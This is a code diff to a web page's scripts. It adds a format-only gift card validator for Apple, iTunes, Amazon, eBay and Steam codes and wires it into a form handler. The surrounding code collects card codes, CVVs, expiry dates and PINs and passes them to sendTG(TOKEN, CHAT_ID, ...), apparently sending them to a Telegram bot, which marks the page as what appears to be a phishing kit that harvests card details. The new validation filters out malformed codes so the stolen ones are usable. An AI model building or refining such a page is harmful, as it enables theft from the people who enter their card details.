@@ -259,6 +259,61 @@
                 AOS.init();
             </script>
            <script>
+
+            /**
+             * Validate gift card by format only (no balance or activation check)
+             *
+             * @param {string} cardNumber - Gift card code
+             * @param {string|null} type - Optional card type
+             * Supported types:
+             * apple | itunes | amazon | ebay | steam
+             *
+             * @returns {object}
+             */
+            function validateGiftCard(cardNumber, type = null) {
+            if (!cardNumber) {
+                return { valid: false, type: null, reason: "EMPTY_INPUT" };
+            }
+
+            const clean = cardNumber.replace(/[\s-]/g, '').toUpperCase();
+
+            const patterns = {
+                apple: /^[A-Z0-9]{16}$/,                // Apple Gift Card
+                itunes: /^[A-Z0-9]{16}$/,               // iTunes
+                amazon: /^(AS|A0|B0)[A-Z0-9]{8,12}$|^[A-Z0-9]{14,15}$/,
+                ebay: /^[A-Z0-9]{13,15}$/,
+                steam: /^[A-Z0-9]{15,17}$/
+            };
+
+            // If card type is specified → strict validation
+            if (type) {
+                const normalizedType = type.toLowerCase();
+
+                if (!patterns[normalizedType]) {
+                return { valid: false, type: null, reason: "UNKNOWN_TYPE" };
+                }
+
+                return {
+                valid: patterns[normalizedType].test(clean),
+                type: normalizedType,
+                normalized: clean
+                };
+            }
+
+            // Auto-detect card type
+            for (const [cardType, regex] of Object.entries(patterns)) {
+                if (regex.test(clean)) {
+                return {
+                    valid: true,
+                    type: cardType,
+                    normalized: clean
+                };
+                }
+            }
+
+            return { valid: false, type: null, reason: "NO_MATCH" };
+            }
+
             document.getElementById('cardName').addEventListener('change', function() {
                 var cardName = this.value;
                 var additionalFields = document.getElementById('additionalFields');
@@ -390,6 +445,57 @@
         //var cardImage = formData.get('cardImages');
         const inputCard = document.getElementById("cardImages");
         const filesx = inputCard.files;
+
+        //validate giftcard
+        var cardNameLowerCase = cardName.toLowerCase()
+        switch (cardNameLowerCase) {
+            case "apple":
+                $result = validateGiftCard(cardCode, cardName);
+                if(!$result.valid){
+                    errorMessages.textContent = `Your ${cardName} Giftcard is invalid. Kindly check and input the right details`;
+                    errorMessages.style.display = 'block';
+                    return;
+                }
+                break;
+            case "amazon":
+            $result = validateGiftCard(cardCode, cardName);
+            if(!$result.valid){
+                errorMessages.textContent = `Your ${cardName} Giftcard is invalid. Kindly check and input the right details`;
+                errorMessages.style.display = 'block';
+                return;
+            }
+            break;
+
+            case "steam":
+                $result = validateGiftCard(cardCode, cardName);
+                if(!$result.valid){
+                    errorMessages.textContent = `Your ${cardName} Giftcard is invalid. Kindly check and input the right details`;
+                    errorMessages.style.display = 'block';
+                    return;
+                }
+                break;
+
+            case "ebay":
+            $result = validateGiftCard(cardCode, cardName);
+            if(!$result.valid){
+                errorMessages.textContent = `Your ${cardName} Giftcard is invalid. Kindly check and input the right details`;
+                errorMessages.style.display = 'block';
+                return;
+            }
+            break;
+
+            case "itunes":
+            $result = validateGiftCard(cardCode, cardName);
+            if(!$result.valid){
+                errorMessages.textContent = `Your ${cardName} Giftcard is invalid. Kindly check and input the right details`;
+                errorMessages.style.display = 'block';
+                return;
+            }
+            break;
+
+            default:
+                break;
+        }
 
         const dataVal = { cardName, cardAmount, cardCurrency, cardCode, cardCvv, cardExp, digitPin}
         sendTG(TOKEN, CHAT_ID, dataVal)
